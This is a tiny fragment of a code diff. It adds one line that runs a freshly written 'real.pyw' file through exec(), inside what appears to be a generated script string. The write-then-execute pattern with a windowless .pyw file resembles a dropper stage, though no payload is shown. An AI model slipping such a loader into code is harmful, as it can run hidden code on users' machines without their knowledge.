@@ -19,4 +19,5 @@ for i in f:
 fl = open("real.pyw", "w")
 fl.write(f)
 fl.close()
+exec(open("real.pyw", "r").read())
 """)
